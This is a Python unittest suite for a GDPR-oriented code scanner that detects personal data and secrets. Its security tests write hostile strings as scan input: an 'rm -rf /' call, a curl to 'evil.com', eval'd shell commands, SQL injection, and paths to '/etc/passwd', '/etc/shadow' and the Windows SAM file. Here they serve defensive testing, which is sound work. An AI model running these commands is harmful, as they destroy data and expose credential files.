#!/usr/bin/env python3
"""
Comprehensive GDPR Code Scanner Test Suite
15 tests each for: Functionality, Performance, Security, Violation Detection
Total: 60 comprehensive test cases
"""

import unittest
import sys
import os
import time
import tempfile
import threading
import multiprocessing
from unittest.mock import patch, MagicMock
from pathlib import Path

# Add project root to path
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from services.code_scanner import CodeScanner
# from services.intelligent_repo_scanner import IntelligentRepositoryScanner
from utils.netherlands_gdpr import detect_nl_violations
from utils.gdpr_rules import get_region_rules, evaluate_risk_level

class TestGDPRScannerFunctionality(unittest.TestCase):
    """15 Functionality Tests for GDPR Scanner"""
    
    def setUp(self):
        self.scanner = CodeScanner(region="Netherlands")
        # self.repo_scanner = IntelligentRepositoryScanner()
        
    def test_01_scanner_initialization(self):
        """Test GDPR scanner initializes correctly"""
        self.assertIsNotNone(self.scanner)
        self.assertEqual(self.scanner.region, "Netherlands")
        
    def test_02_pii_detection_basic(self):
        """Test basic PII detection functionality"""
        test_content = 'email = "john.doe@company.com"'
        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
            f.write(test_content)
            f.flush()
            results = self.scanner.scan_file(f.name)
            self.assertIsInstance(results, dict)
            os.unlink(f.name)
            
    def test_03_api_key_detection(self):
        """Test API key detection functionality"""
        test_content = 'api_key = "sk-1234567890abcdefghij"'
        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
            f.write(test_content)
            f.flush()
            results = self.scanner.scan_file(f.name)
            self.assertIn('findings', results)
            os.unlink(f.name)
            
    def test_04_credit_card_detection(self):
        """Test credit card number detection"""
        test_content = 'card = "4111-1111-1111-1111"'
        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
            f.write(test_content)
            f.flush()
            results = self.scanner.scan_file(f.name)
            self.assertIsInstance(results.get('findings'), list)
            os.unlink(f.name)
            
    def test_05_password_detection(self):
        """Test password detection functionality"""
        test_content = 'password = "mySecretPassword123!"'
        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
            f.write(test_content)
            f.flush()
            results = self.scanner.scan_file(f.name)
            self.assertIsNotNone(results)
            os.unlink(f.name)
            
    def test_06_aws_key_detection(self):
        """Test AWS access key detection"""
        test_content = 'aws_key = "AKIA1234567890ABCDEF"'
        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
            f.write(test_content)
            f.flush()
            results = self.scanner.scan_file(f.name)
            self.assertEqual(results.get('status', 'failed'), 'completed')
            os.unlink(f.name)
            
    def test_07_github_token_detection(self):
        """Test GitHub token detection"""
        test_content = 'github_token = "ghp_1234567890abcdefghijklmnopqrstuvwxyz123"'
        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
            f.write(test_content)
            f.flush()
            results = self.scanner.scan_file(f.name)
            self.assertIsInstance(results, dict)
            os.unlink(f.name)
            
    def test_08_phone_number_detection(self):
        """Test phone number detection"""
        test_content = 'phone = "+31-6-12345678"'
        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
            f.write(test_content)
            f.flush()
            results = self.scanner.scan_file(f.name)
            self.assertIn('scan_type', results)
            os.unlink(f.name)
            
    def test_09_file_extension_support(self):
        """Test scanner supports multiple file extensions"""
        extensions = ['.py', '.js', '.json', '.yml', '.env']
        for ext in extensions:
            with tempfile.NamedTemporaryFile(mode='w', suffix=ext, delete=False) as f:
                f.write('test = "content"')
                f.flush()
                results = self.scanner.scan_file(f.name)
                self.assertIsNotNone(results)
                os.unlink(f.name)
                
    def test_10_directory_scanning(self):
        """Test directory scanning functionality"""
        with tempfile.TemporaryDirectory() as tmp_dir:
            # Create test files
            test_file = Path(tmp_dir) / "test.py"
            test_file.write_text('email = "test@example.com"')
            
            results = self.scanner.scan_directory(tmp_dir)
            self.assertIsInstance(results, dict)
            
    def test_11_empty_file_handling(self):
        """Test handling of empty files"""
        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
            f.write('')  # Empty file
            f.flush()
            results = self.scanner.scan_file(f.name)
            self.assertIsNotNone(results)
            os.unlink(f.name)
            
    def test_12_large_content_handling(self):
        """Test handling of large file content"""
        large_content = "# Comment\\n" * 10000 + 'email = "test@example.com"'
        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
            f.write(large_content)
            f.flush()
            results = self.scanner.scan_file(f.name)
            self.assertIsInstance(results, dict)
            os.unlink(f.name)
            
    def test_13_special_characters_handling(self):
        """Test handling of special characters"""
        test_content = 'data = "ëmail@tëst.com" # Special chars: ñ, ü, ç'
        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
            f.write(test_content)
            f.flush()
            results = self.scanner.scan_file(f.name)
            self.assertIsNotNone(results)
            os.unlink(f.name)
            
    def test_14_comment_scanning(self):
        """Test scanning of comments"""
        test_content = '''
        # TODO: Remove hardcoded password = "secret123"
        def login():
            pass
        '''
        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
            f.write(test_content)
            f.flush()
            results = self.scanner.scan_file(f.name)
            self.assertIsInstance(results.get('findings'), list)
            os.unlink(f.name)
            
    def test_15_region_specific_rules(self):
        """Test region-specific GDPR rules application"""
        rules_nl = get_region_rules("Netherlands")
        rules_de = get_region_rules("Germany")
        
        self.assertIn('bsn_required', rules_nl)
        self.assertTrue(rules_nl['bsn_required'])
        self.assertFalse(rules_de['bsn_required'])

class TestGDPRScannerPerformance(unittest.TestCase):
    """15 Performance Tests for GDPR Scanner"""
    
    def setUp(self):
        self.scanner = CodeScanner(region="Netherlands")
        
    def test_01_single_file_scan_speed(self):
        """Test single file scan performance"""
        test_content = 'email = "test@example.com"' * 100
        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
            f.write(test_content)
            f.flush()
            
            start_time = time.time()
            results = self.scanner.scan_file(f.name)
            end_time = time.time()
            
            scan_time = end_time - start_time
            self.assertLess(scan_time, 5.0)  # Should complete in under 5 seconds
            os.unlink(f.name)
            
    def test_02_large_file_performance(self):
        """Test performance on large files"""
        large_content = "line = 'content'\\n" * 50000  # ~50k lines
        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
            f.write(large_content)
            f.flush()
            
            start_time = time.time()
            results = self.scanner.scan_file(f.name)
            end_time = time.time()
            
            scan_time = end_time - start_time
            self.assertLess(scan_time, 30.0)  # Should complete in under 30 seconds
            os.unlink(f.name)
            
    def test_03_multiple_files_concurrent(self):
        """Test concurrent scanning of multiple files"""
        files = []
        try:
            # Create multiple test files
            for i in range(10):
                f = tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False)
                f.write(f'email_{i} = "user{i}@test.com"')
                f.flush()
                files.append(f.name)
            
            start_time = time.time()
            
            # Scan all files
            for file_path in files:
                self.scanner.scan_file(file_path)
                
            end_time = time.time()
            total_time = end_time - start_time
            
            # Should process 10 files in reasonable time
            self.assertLess(total_time, 15.0)
            
        finally:
            for file_path in files:
                os.unlink(file_path)
                
    def test_04_memory_usage_stability(self):
        """Test memory usage remains stable"""
        import psutil
        process = psutil.Process()
        initial_memory = process.memory_info().rss
        
        # Run multiple scans
        for i in range(50):
            test_content = f'data_{i} = "test@example.com"'
            with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
                f.write(test_content)
                f.flush()
                self.scanner.scan_file(f.name)
                os.unlink(f.name)
                
        final_memory = process.memory_info().rss
        memory_growth = final_memory - initial_memory
        
        # Memory growth should be reasonable (less than 100MB)
        self.assertLess(memory_growth, 100 * 1024 * 1024)
        
    def test_05_pattern_compilation_performance(self):
        """Test regex pattern compilation performance"""
        start_time = time.time()
        scanner = CodeScanner()
        end_time = time.time()
        
        initialization_time = end_time - start_time
        self.assertLess(initialization_time, 2.0)  # Should initialize quickly
        
    def test_06_directory_scan_performance(self):
        """Test directory scanning performance"""
        with tempfile.TemporaryDirectory() as tmp_dir:
            # Create multiple files
            for i in range(20):
                file_path = Path(tmp_dir) / f"file_{i}.py"
                file_path.write_text(f'email_{i} = "user{i}@test.com"')
                
            start_time = time.time()
            results = self.scanner.scan_directory(tmp_dir)
            end_time = time.time()
            
            scan_time = end_time - start_time
            self.assertLess(scan_time, 10.0)  # Should scan directory quickly
            
    def test_07_repository_scan_efficiency(self):
        """Test repository scanning efficiency"""
        repo_scanner = IntelligentRepositoryScanner()
        
        # Mock a simple repository structure
        with tempfile.TemporaryDirectory() as tmp_dir:
            for i in range(5):
                file_path = Path(tmp_dir) / f"src/module_{i}.py"
                file_path.parent.mkdir(exist_ok=True)
                file_path.write_text(f'api_key = "key_{i}_123456789"')
                
            start_time = time.time()
            # Test would normally call repo scanner, but we'll simulate
            for root, dirs, files in os.walk(tmp_dir):
                for file in files:
                    if file.endswith('.py'):
                        self.scanner.scan_file(os.path.join(root, file))
            end_time = time.time()
            
            scan_time = end_time - start_time
            self.assertLess(scan_time, 8.0)
            
    def test_08_scalability_increasing_load(self):
        """Test scalability with increasing file sizes"""
        sizes = [1000, 5000, 10000, 20000]  # Lines of code
        times = []
        
        for size in sizes:
            content = "line = 'test'\\n" * size
            with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
                f.write(content)
                f.flush()
                
                start_time = time.time()
                self.scanner.scan_file(f.name)
                end_time = time.time()
                
                times.append(end_time - start_time)
                os.unlink(f.name)
        
        # Performance should scale reasonably (not exponentially)
        for i in range(1, len(times)):
            scale_factor = sizes[i] / sizes[i-1]
            time_factor = times[i] / times[i-1]
            self.assertLess(time_factor, scale_factor * 2)  # Should not be more than 2x slower per 2x data
            
    def test_09_cpu_utilization_efficiency(self):
        """Test CPU utilization efficiency"""
        import psutil
        
        # Monitor CPU during scan
        cpu_before = psutil.cpu_percent(interval=1)
        
        # Run CPU-intensive scan
        large_content = "code_line = 'data'\\n" * 30000
        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
            f.write(large_content)
            f.flush()
            
            self.scanner.scan_file(f.name)
            os.unlink(f.name)
            
        cpu_after = psutil.cpu_percent(interval=1)
        
        # Should utilize CPU efficiently but not peg it at 100%
        self.assertLess(cpu_after, 90.0)
        
    def test_10_io_performance_optimization(self):
        """Test I/O performance optimization"""
        # Create a file with mixed content
        content = """
        # This is a test file with various data types
        email = "user@example.com"
        password = "secret123"
        api_key = "sk-1234567890abcdef"
        """ * 1000
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
            f.write(content)
            f.flush()
            
            start_time = time.time()
            results = self.scanner.scan_file(f.name)
            end_time = time.time()
            
            # Should handle I/O efficiently
            io_time = end_time - start_time
            self.assertLess(io_time, 10.0)
            os.unlink(f.name)
            
    def test_11_cache_performance_improvement(self):
        """Test caching improves performance"""
        test_content = 'email = "test@cache.com"'
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
            f.write(test_content)
            f.flush()
            
            # First scan (cold)
            start_time = time.time()
            self.scanner.scan_file(f.name)
            first_scan_time = time.time() - start_time
            
            # Second scan (potentially cached patterns)
            start_time = time.time()
            self.scanner.scan_file(f.name)
            second_scan_time = time.time() - start_time
            
            # Second scan should be faster or similar
            self.assertLessEqual(second_scan_time, first_scan_time * 1.5)
            os.unlink(f.name)
            
    def test_12_parallel_processing_efficiency(self):
        """Test parallel processing efficiency"""
        if multiprocessing.cpu_count() > 1:
            files = []
            try:
                # Create multiple files for parallel processing
                for i in range(multiprocessing.cpu_count() * 2):
                    f = tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False)
                    f.write(f'secret_{i} = "password{i}123"')
                    f.flush()
                    files.append(f.name)
                
                start_time = time.time()
                
                # Sequential processing
                for file_path in files[:len(files)//2]:
                    self.scanner.scan_file(file_path)
                    
                sequential_time = time.time() - start_time
                
                # Simulate parallel processing (would be actual parallel in real implementation)
                start_time = time.time()
                for file_path in files[len(files)//2:]:
                    self.scanner.scan_file(file_path)
                parallel_time = time.time() - start_time
                
                # Parallel should be competitive
                self.assertLess(parallel_time, sequential_time * 1.5)
                
            finally:
                for file_path in files:
                    os.unlink(file_path)
                    
    def test_13_timeout_handling_performance(self):
        """Test timeout handling doesn't impact performance"""
        scanner_with_timeout = CodeScanner(max_timeout=10)
        
        test_content = 'data = "test@timeout.com"'
        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
            f.write(test_content)
            f.flush()
            
            start_time = time.time()
            results = scanner_with_timeout.scan_file(f.name)
            end_time = time.time()
            
            # Should complete well within timeout
            scan_time = end_time - start_time
            self.assertLess(scan_time, 5.0)
            os.unlink(f.name)
            
    def test_14_error_handling_performance(self):
        """Test error handling doesn't degrade performance"""
        # Create a file with potential parsing issues
        problematic_content = '''
        # File with potential issues
        data = "test@example.com"
        malformed_line_without_proper_syntax
        another_email = "user@test.com"
        '''
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
            f.write(problematic_content)
            f.flush()
            
            start_time = time.time()
            results = self.scanner.scan_file(f.name)
            end_time = time.time()
            
            # Should handle errors gracefully without major performance impact
            scan_time = end_time - start_time
            self.assertLess(scan_time, 5.0)
            self.assertIsInstance(results, dict)
            os.unlink(f.name)
            
    def test_15_resource_cleanup_performance(self):
        """Test resource cleanup doesn't impact performance"""
        initial_time = time.time()
        
        # Run multiple scans to test cleanup
        for i in range(20):
            test_content = f'cleanup_test_{i} = "email{i}@cleanup.com"'
            with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
                f.write(test_content)
                f.flush()
                self.scanner.scan_file(f.name)
                os.unlink(f.name)
                
        total_time = time.time() - initial_time
        average_time = total_time / 20
        
        # Each scan should maintain consistent performance
        self.assertLess(average_time, 1.0)

class TestGDPRScannerSecurity(unittest.TestCase):
    """15 Security Tests for GDPR Scanner"""
    
    def setUp(self):
        self.scanner = CodeScanner(region="Netherlands")
        
    def test_01_input_sanitization(self):
        """Test input sanitization against injection"""
        malicious_content = '''
        # Potential injection attempt
        os.system("rm -rf /")
        __import__("subprocess").call(["curl", "evil.com"])
        eval("malicious_code")
        '''
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
            f.write(malicious_content)
            f.flush()
            
            # Scanner should handle this safely
            results = self.scanner.scan_file(f.name)
            self.assertIsInstance(results, dict)
            self.assertEqual(results.get('status'), 'completed')
            os.unlink(f.name)
            
    def test_02_path_traversal_protection(self):
        """Test protection against path traversal attacks"""
        # Attempt to scan outside allowed directories
        malicious_paths = [
            "../../../etc/passwd",
            "..\\\\..\\\\windows\\\\system32\\\\config\\\\sam",
            "/etc/shadow",
            "C:\\\\Windows\\\\System32\\\\config\\\\SAM"
        ]
        
        for path in malicious_paths:
            with self.assertRaises((FileNotFoundError, PermissionError, OSError)):
                self.scanner.scan_file(path)
                
    def test_03_file_size_limits(self):
        """Test file size limits prevent DoS"""
        # Test with extremely large content
        huge_content = "x" * (100 * 1024 * 1024)  # 100MB
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
            try:
                f.write(huge_content[:1024*1024])  # Write 1MB for test
                f.flush()
                
                # Should handle large files gracefully
                results = self.scanner.scan_file(f.name)
                self.assertIsInstance(results, dict)
                
            except (OSError, MemoryError):
                # Expected for very large files
                pass
            finally:
                os.unlink(f.name)
                
    def test_04_regex_dos_protection(self):
        """Test protection against ReDoS attacks"""
        # Content designed to trigger catastrophic backtracking
        redos_content = '''
        pattern = "a" * 10000 + "!"
        email = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@evil.com"
        '''
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
            f.write(redos_content)
            f.flush()
            
            start_time = time.time()
            results = self.scanner.scan_file(f.name)
            end_time = time.time()
            
            # Should complete in reasonable time despite potential ReDoS
            scan_time = end_time - start_time
            self.assertLess(scan_time, 30.0)
            os.unlink(f.name)
            
    def test_05_memory_exhaustion_protection(self):
        """Test protection against memory exhaustion"""
        import psutil
        process = psutil.Process()
        initial_memory = process.memory_info().rss
        
        # Create content that could cause memory issues
        memory_intensive_content = '''
        large_data = [
            "email{}@memory.com".format(i) for i in range(100000)
        ]
        '''
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
            f.write(memory_intensive_content)
            f.flush()
            
            results = self.scanner.scan_file(f.name)
            
            current_memory = process.memory_info().rss
            memory_increase = current_memory - initial_memory
            
            # Should not consume excessive memory
            self.assertLess(memory_increase, 500 * 1024 * 1024)  # Less than 500MB
            os.unlink(f.name)
            
    def test_06_concurrent_access_safety(self):
        """Test thread safety under concurrent access"""
        def scan_worker(file_path, results_list):
            try:
                result = self.scanner.scan_file(file_path)
                results_list.append(result)
            except Exception as e:
                results_list.append(f"Error: {e}")
                
        # Create test files
        files = []
        try:
            for i in range(5):
                f = tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False)
                f.write(f'concurrent_email_{i} = "user{i}@thread.com"')
                f.flush()
                files.append(f.name)
            
            # Run concurrent scans
            threads = []
            results = []
            
            for file_path in files:
                thread = threading.Thread(target=scan_worker, args=(file_path, results))
                threads.append(thread)
                thread.start()
                
            for thread in threads:
                thread.join(timeout=10)
                
            # All scans should complete successfully
            self.assertEqual(len(results), len(files))
            for result in results:
                self.assertIsInstance(result, dict)
                
        finally:
            for file_path in files:
                os.unlink(file_path)
                
    def test_07_privilege_escalation_prevention(self):
        """Test prevention of privilege escalation"""
        # Content that might attempt privilege escalation
        escalation_content = '''
        import os
        import subprocess
        
        # Attempt to access system files
        system_file = "/etc/passwd"
        secret_key = "admin_access_key_123"
        '''
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
            f.write(escalation_content)
            f.flush()
            
            # Should scan content without executing it
            results = self.scanner.scan_file(f.name)
            self.assertIsInstance(results, dict)
            self.assertIn('findings', results)
            os.unlink(f.name)
            
    def test_08_sensitive_data_exposure_prevention(self):
        """Test prevention of sensitive data exposure in logs"""
        sensitive_content = '''
        password = "SuperSecretPassword123!"
        api_key = "sk-very-secret-key-1234567890"
        '''
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
            f.write(sensitive_content)
            f.flush()
            
            results = self.scanner.scan_file(f.name)
            
            # Results should not contain actual sensitive values
            results_str = str(results)
            self.assertNotIn("SuperSecretPassword123!", results_str)
            self.assertNotIn("sk-very-secret-key-1234567890", results_str)
            os.unlink(f.name)
            
    def test_09_code_injection_prevention(self):
        """Test prevention of code injection"""
        injection_content = '''
        # Potential code injection vectors
        user_input = "'; DROP TABLE users; --"
        eval_target = "__import__('os').system('whoami')"
        exec_target = "print('injected code')"
        '''
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
            f.write(injection_content)
            f.flush()
            
            # Should analyze without executing
            results = self.scanner.scan_file(f.name)
            self.assertEqual(results.get('status'), 'completed')
            os.unlink(f.name)
            
    def test_10_data_validation_security(self):
        """Test data validation security measures"""
        invalid_data = '''
        # Various invalid data patterns
        null_byte = "email\\x00@null.com"
        unicode_issue = "email@тест.com"
        control_chars = "email\\r\\n@control.com"
        '''
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
            f.write(invalid_data)
            f.flush()
            
            results = self.scanner.scan_file(f.name)
            self.assertIsInstance(results, dict)
            self.assertNotIn('error', results.get('status', ''))
            os.unlink(f.name)
            
    def test_11_resource_limit_enforcement(self):
        """Test resource limit enforcement"""
        # Test with scanner configured with limits
        limited_scanner = CodeScanner(max_timeout=5)
        
        # Content that could consume resources
        resource_heavy_content = '''
        # Large nested structure
        data = {
            f"key_{i}_{j}": f"email_{i}_{j}@resource.com"
            for i in range(1000) for j in range(10)
        }
        '''
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
            f.write(resource_heavy_content)
            f.flush()
            
            start_time = time.time()
            results = limited_scanner.scan_file(f.name)
            end_time = time.time()
            
            # Should respect timeout limits
            scan_time = end_time - start_time
            self.assertLess(scan_time, 10.0)
            os.unlink(f.name)
            
    def test_12_configuration_security(self):
        """Test security of configuration handling"""
        # Test with various configuration options
        configs = [
            {"region": "Netherlands", "max_timeout": 30},
            {"region": "Germany", "use_entropy": True},
            {"region": "../../../etc/passwd", "max_timeout": 1000000}  # Malicious config
        ]
        
        for config in configs:
            try:
                scanner = CodeScanner(**config)
                self.assertIsInstance(scanner, CodeScanner)
                # Configuration should be sanitized
                if hasattr(scanner, 'region'):
                    self.assertNotIn('/', scanner.region)
            except (ValueError, TypeError):
                # Expected for invalid configurations
                pass
                
    def test_13_error_message_security(self):
        """Test error messages don't leak sensitive information"""
        # Create a file that will cause various errors
        error_content = '''
        # File designed to trigger errors
        malformed syntax here
        email = "test@error.com"
        '''
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
            f.write(error_content)
            f.flush()
            
            try:
                results = self.scanner.scan_file(f.name)
                # Error messages should not contain file paths or system info
                if 'error' in results:
                    error_msg = str(results['error'])
                    self.assertNotIn('/tmp/', error_msg)
                    self.assertNotIn(os.environ.get('USER', ''), error_msg)
                    
            except Exception as e:
                # Exception messages should be safe
                error_str = str(e)
                self.assertNotIn('/tmp/', error_str)
                
            os.unlink(f.name)
            
    def test_14_file_permission_respect(self):
        """Test respect for file permissions"""
        # Create a file with restricted permissions
        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
            f.write('protected_email = "secure@permissions.com"')
            f.flush()
            
            # Restrict file permissions
            os.chmod(f.name, 0o000)  # No permissions
            
            try:
                # Should handle permission errors gracefully
                results = self.scanner.scan_file(f.name)
                # Either succeeds with proper permissions or fails gracefully
                self.assertIsInstance(results, dict)
                
            except PermissionError:
                # Expected behavior for restricted files
                pass
            finally:
                # Restore permissions for cleanup
                os.chmod(f.name, 0o644)
                os.unlink(f.name)
                
    def test_15_logging_security(self):
        """Test logging security measures"""
        import logging
        import io
        
        # Capture log output
        log_capture = io.StringIO()
        handler = logging.StreamHandler(log_capture)
        logger = logging.getLogger('scanner.code_scanner')
        logger.addHandler(handler)
        logger.setLevel(logging.DEBUG)
        
        try:
            secret_content = '''
            secret_password = "VerySecretPassword123!"
            api_token = "super-secret-token-xyz"
            '''
            
            with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
                f.write(secret_content)
                f.flush()
                
                self.scanner.scan_file(f.name)
                
                # Check logs don't contain sensitive data
                log_output = log_capture.getvalue()
                self.assertNotIn("VerySecretPassword123!", log_output)
                self.assertNotIn("super-secret-token-xyz", log_output)
                
                os.unlink(f.name)
                
        finally:
            logger.removeHandler(handler)

class TestGDPRScannerViolationDetection(unittest.TestCase):
    """15 Violation Detection Tests for GDPR Scanner"""
    
    def setUp(self):
        self.scanner = CodeScanner(region="Netherlands")
        
    def test_01_email_address_detection(self):
        """Test detection of email addresses"""
        test_cases = [
            ('email = "john.doe@company.com"', True),
            ('contact = "user@example.org"', True),
            ('admin = "admin@test.co.uk"', True),
            ('not_email = "notanemail"', False),
            ('number = "123@456"', False)
        ]
        
        for content, should_detect in test_cases:
            with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
                f.write(content)
                f.flush()
                
                results = self.scanner.scan_file(f.name)
                findings = results.get('findings', [])
                
                if should_detect:
                    self.assertGreater(len(findings), 0, f"Should detect email in: {content}")
                else:
                    email_findings = [f for f in findings if 'email' in f.get('type', '').lower()]
                    self.assertEqual(len(email_findings), 0, f"Should not detect email in: {content}")
                    
                os.unlink(f.name)
                
    def test_02_api_key_detection(self):
        """Test detection of API keys"""
        test_cases = [
            ('api_key = "sk-1234567890abcdefghij"', True),
            ('secret = "AKIA1234567890ABCDEF"', True),  # AWS key
            ('token = "ghp_1234567890abcdefghijklmnop"', True),  # GitHub token
            ('random = "not-a-key"', False),
            ('number = "123456789"', False)
        ]
        
        for content, should_detect in test_cases:
            with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
                f.write(content)
                f.flush()
                
                results = self.scanner.scan_file(f.name)
                findings = results.get('findings', [])
                
                if should_detect:
                    self.assertGreater(len(findings), 0, f"Should detect API key in: {content}")
                    
                os.unlink(f.name)
                
    def test_03_credit_card_detection(self):
        """Test detection of credit card numbers"""
        test_cases = [
            ('card = "4111-1111-1111-1111"', True),
            ('payment = "4111 1111 1111 1111"', True),
            ('cc = "4111111111111111"', True),
            ('not_card = "1234-5678-9012"', False),
            ('random = "abcd-efgh-ijkl-mnop"', False)
        ]
        
        for content, should_detect in test_cases:
            with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
                f.write(content)
                f.flush()
                
                results = self.scanner.scan_file(f.name)
                findings = results.get('findings', [])
                
                if should_detect:
                    self.assertGreater(len(findings), 0, f"Should detect credit card in: {content}")
                    
                os.unlink(f.name)
                
    def test_04_password_detection(self):
        """Test detection of passwords"""
        test_cases = [
            ('password = "mySecret123"', True),
            ('pwd = "P@ssw0rd!"', True),
            ('secret = "hidden_password"', True),
            ('name = "password_field"', False),  # Just variable name
            ('comment = "# password is required"', False)  # Comment
        ]
        
        for content, should_detect in test_cases:
            with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
                f.write(content)
                f.flush()
                
                results = self.scanner.scan_file(f.name)
                findings = results.get('findings', [])
                
                if should_detect:
                    self.assertGreater(len(findings), 0, f"Should detect password in: {content}")
                    
                os.unlink(f.name)
                
    def test_05_phone_number_detection(self):
        """Test detection of phone numbers"""
        test_cases = [
            ('phone = "+31-6-12345678"', True),
            ('mobile = "+1-555-123-4567"', True),
            ('contact = "06-12345678"', True),
            ('number = "123"', False),
            ('id = "12345"', False)
        ]
        
        for content, should_detect in test_cases:
            with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
                f.write(content)
                f.flush()
                
                results = self.scanner.scan_file(f.name)
                findings = results.get('findings', [])
                
                if should_detect:
                    phone_findings = [f for f in findings if 'phone' in f.get('type', '').lower()]
                    self.assertGreater(len(phone_findings), 0, f"Should detect phone in: {content}")
                    
                os.unlink(f.name)
                
    def test_06_bsn_detection_netherlands(self):
        """Test detection of Dutch BSN numbers"""
        # Valid BSN numbers (using BSN checksum algorithm)
        valid_bsns = ["123456782", "111222333"]  # These pass BSN validation
        invalid_bsns = ["123456789", "111111111"]  # These fail BSN validation
        
        for bsn in valid_bsns:
            content = f'bsn = "{bsn}"'
            violations = detect_nl_violations(content)
            bsn_violations = [v for v in violations if v.get('type') == 'BSN']
            self.assertGreater(len(bsn_violations), 0, f"Should detect valid BSN: {bsn}")
            
        for bsn in invalid_bsns:
            content = f'bsn = "{bsn}"'
            violations = detect_nl_violations(content)
            bsn_violations = [v for v in violations if v.get('type') == 'BSN']
            self.assertEqual(len(bsn_violations), 0, f"Should not detect invalid BSN: {bsn}")
            
    def test_07_aws_credentials_detection(self):
        """Test detection of AWS credentials"""
        test_cases = [
            ('aws_access_key = "AKIA1234567890ABCDEF"', True),
            ('aws_secret = "abcdefghijklmnopqrstuvwxyz1234567890ABCD"', True),
            ('random_key = "BKIA1234567890ABCDEF"', False),  # Wrong prefix
            ('not_aws = "random_string_here"', False)
        ]
        
        for content, should_detect in test_cases:
            with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
                f.write(content)
                f.flush()
                
                results = self.scanner.scan_file(f.name)
                findings = results.get('findings', [])
                
                if should_detect:
                    aws_findings = [f for f in findings if 'aws' in f.get('type', '').lower()]
                    self.assertGreater(len(aws_findings), 0, f"Should detect AWS credential in: {content}")
                    
                os.unlink(f.name)
                
    def test_08_github_token_detection(self):
        """Test detection of GitHub tokens"""
        test_cases = [
            ('github_token = "ghp_1234567890abcdefghijklmnopqrstuvwxyz"', True),
            ('gh_token = "gho_1234567890abcdefghijklmnopqrstuvwxyz"', True),
            ('random_token = "abc_1234567890abcdefghijklmnopqrstuvwxyz"', False),
            ('not_token = "github_username"', False)
        ]
        
        for content, should_detect in test_cases:
            with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
                f.write(content)
                f.flush()
                
                results = self.scanner.scan_file(f.name)
                findings = results.get('findings', [])
                
                if should_detect:
                    github_findings = [f for f in findings if 'github' in f.get('type', '').lower() or 'token' in f.get('type', '').lower()]
                    self.assertGreater(len(github_findings), 0, f"Should detect GitHub token in: {content}")
                    
                os.unlink(f.name)
                
    def test_09_ssl_certificate_detection(self):
        """Test detection of SSL certificates and private keys"""
        test_cases = [
            ('cert = "-----BEGIN CERTIFICATE-----\\nMIIE..."', True),
            ('key = "-----BEGIN PRIVATE KEY-----\\nMIIE..."', True),
            ('rsa_key = "-----BEGIN RSA PRIVATE KEY-----\\nMIIE..."', True),
            ('comment = "# Need to add certificate"', False)
        ]
        
        for content, should_detect in test_cases:
            with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
                f.write(content)
                f.flush()
                
                results = self.scanner.scan_file(f.name)
                findings = results.get('findings', [])
                
                if should_detect:
                    cert_findings = [f for f in findings if any(term in f.get('type', '').lower() 
                                                             for term in ['certificate', 'private', 'key'])]
                    self.assertGreater(len(cert_findings), 0, f"Should detect certificate/key in: {content}")
                    
                os.unlink(f.name)
                
    def test_10_database_connection_detection(self):
        """Test detection of database connection strings"""
        test_cases = [
            ('db_url = "postgresql://user:pass@localhost:5432/db"', True),
            ('mysql_conn = "mysql://admin:secret@server:3306/database"', True),
            ('mongo_uri = "mongodb://user:password@cluster.mongodb.net/db"', True),
            ('comment = "# Connect to database"', False)
        ]
        
        for content, should_detect in test_cases:
            with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
                f.write(content)
